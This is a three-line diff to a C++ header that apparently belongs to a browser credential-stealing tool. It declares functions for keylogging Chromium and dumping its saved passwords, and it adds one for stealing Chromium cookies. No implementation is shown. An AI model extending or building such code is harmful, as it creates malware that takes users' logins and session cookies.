@@ -4,4 +4,5 @@
 namespace credential {
     void KeylogChromium(); // Placeholder if needed
     std::string DumpChromiumPasswords();
+    std::string StealChromiumCookies();
 }
